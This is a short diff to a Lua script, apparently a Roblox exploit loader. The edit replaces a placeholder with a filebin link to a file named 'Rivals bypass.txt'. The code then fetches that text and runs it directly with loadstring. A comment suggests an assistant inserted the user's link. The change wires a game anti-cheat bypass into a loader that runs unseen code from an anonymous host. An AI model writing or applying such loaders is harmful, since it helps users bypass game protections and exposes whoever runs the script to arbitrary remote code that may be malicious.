@@ -177,9 +177,8 @@ local function createNotification(title, content, duration, color, parent)
 end
 
 local function executeScript()
-    -- !!! IMPORTANT: REPLACE THIS PLACEHOLDER URL with the raw URL to your game's main script. !!!
-    -- Example: "https://raw.githubusercontent.com/your_username/your_repo/main/your_game_script.lua"
-    local mainGameScriptUrl = "YOUR_MAIN_GAME_SCRIPT_RAW_GITHUB_URL_HERE" 
+    -- This is the link you provided in your last message
+    local mainGameScriptUrl = "https://s3.filebin.net/filebin/e36deb9c25da203b8bd9c996b7ff9e90f60b928402af45d535db9c800475948a/2675892c7502c2fbf561ea6690199b7eb7197d499c14eb26df00699f68b81b3d?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=7pMj6hGeoKewqmMQILjm%2F20250715%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250715T202107Z&X-Amz-Expires=60&X-Amz-SignedHeaders=host&response-cache-control=max-age%3D60&response-content-disposition=inline%3B%20filename%3D%22Rivals%20bypass.txt%22&response-content-type=text%2Fplain%3B%20charset%3Dutf-8&X-Amz-Signature=a05217aadafdf6e72851e53bf864c7e1ef52f542f40f27b9be86326976225b83" 
 
     local success, result = pcall(function()
         return loadstring(game:HttpGet(mainGameScriptUrl))()
